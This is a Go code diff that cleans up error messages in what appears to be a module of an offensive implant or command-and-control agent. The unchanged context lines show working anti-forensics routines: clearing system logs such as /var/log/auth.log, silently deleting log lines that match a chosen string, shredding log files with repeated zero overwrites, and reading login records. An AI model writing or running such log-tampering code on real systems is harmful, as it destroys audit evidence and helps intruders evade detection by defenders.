@@ -55,7 +55,7 @@ var loginRecordFiles = []string{
 
 func (c *LinuxLogsCommand) Execute(task structs.Task) structs.CommandResult {
 	if task.Params == "" {
-		return errorResult("Error: parameters required. Actions: list, read, logins, clear, truncate, shred")
+		return errorResult("parameters required. Actions: list, read, logins, clear, truncate, shred")
 	}
 
 	var args linuxLogsArgs
@@ -146,12 +146,12 @@ func linuxLogsList() structs.CommandResult {
 
 func linuxLogsRead(args linuxLogsArgs) structs.CommandResult {
 	if args.File == "" {
-		return errorResult("Error: file parameter required (e.g., /var/log/auth.log)")
+		return errorResult("file parameter required (e.g., /var/log/auth.log)")
 	}
 
 	content, err := os.ReadFile(args.File)
 	if err != nil {
-		return errorf("Error reading %s: %v", args.File, err)
+		return errorf("reading %s: %v", args.File, err)
 	}
 
 	lines := strings.Split(strings.TrimRight(string(content), "\n"), "\n")
@@ -291,12 +291,12 @@ func utmpTypeName(t int16) string {
 
 func linuxLogsClear(args linuxLogsArgs) structs.CommandResult {
 	if args.File == "" {
-		return errorResult("Error: file parameter required (e.g., /var/log/auth.log)")
+		return errorResult("file parameter required (e.g., /var/log/auth.log)")
 	}
 
 	// Truncate file to zero bytes (preserves file permissions and inode)
 	if err := os.Truncate(args.File, 0); err != nil {
-		return errorf("Error clearing %s: %v", args.File, err)
+		return errorf("clearing %s: %v", args.File, err)
 	}
 
 	return successf("Cleared: %s (truncated to 0 bytes)", args.File)
@@ -304,17 +304,17 @@ func linuxLogsClear(args linuxLogsArgs) structs.CommandResult {
 
 func linuxLogsTruncate(args linuxLogsArgs) structs.CommandResult {
 	if args.File == "" {
-		return errorResult("Error: file parameter required")
+		return errorResult("file parameter required")
 	}
 
 	content, err := os.ReadFile(args.File)
 	if err != nil {
-		return errorf("Error reading %s: %v", args.File, err)
+		return errorf("reading %s: %v", args.File, err)
 	}
 	defer structs.ZeroBytes(content)
 
 	if args.Search == "" {
-		return errorResult("Error: search parameter required (lines matching this string will be removed)")
+		return errorResult("search parameter required (lines matching this string will be removed)")
 	}
 
 	lines := strings.Split(string(content), "\n")
@@ -333,7 +333,7 @@ func linuxLogsTruncate(args linuxLogsArgs) structs.CommandResult {
 	}
 
 	if err := os.WriteFile(args.File, []byte(strings.Join(kept, "\n")), 0644); err != nil {
-		return errorf("Error writing %s: %v", args.File, err)
+		return errorf("writing %s: %v", args.File, err)
 	}
 
 	return successf("Removed %d lines matching '%s' from %s", removed, args.Search, args.File)
@@ -341,12 +341,12 @@ func linuxLogsTruncate(args linuxLogsArgs) structs.CommandResult {
 
 func linuxLogsShred(args linuxLogsArgs) structs.CommandResult {
 	if args.File == "" {
-		return errorResult("Error: file parameter required")
+		return errorResult("file parameter required")
 	}
 
 	info, err := os.Stat(args.File)
 	if err != nil {
-		return errorf("Error: failed to stat log file %q: %v", args.File, err)
+		return errorf("failed to stat log file %q: %v", args.File, err)
 	}
 
 	size := info.Size()
@@ -354,14 +354,14 @@ func linuxLogsShred(args linuxLogsArgs) structs.CommandResult {
 	// Overwrite with zeros 3 times
 	f, err := os.OpenFile(args.File, os.O_WRONLY, 0)
 	if err != nil {
-		return errorf("Error opening %s: %v", args.File, err)
+		return errorf("opening %s: %v", args.File, err)
 	}
 	defer f.Close()
 
 	zeros := make([]byte, 4096)
 	for pass := 0; pass < 3; pass++ {
 		if _, err := f.Seek(0, 0); err != nil {
-			return errorf("Error seeking %s: %v", args.File, err)
+			return errorf("seeking %s: %v", args.File, err)
 		}
 		remaining := size
 		for remaining > 0 {
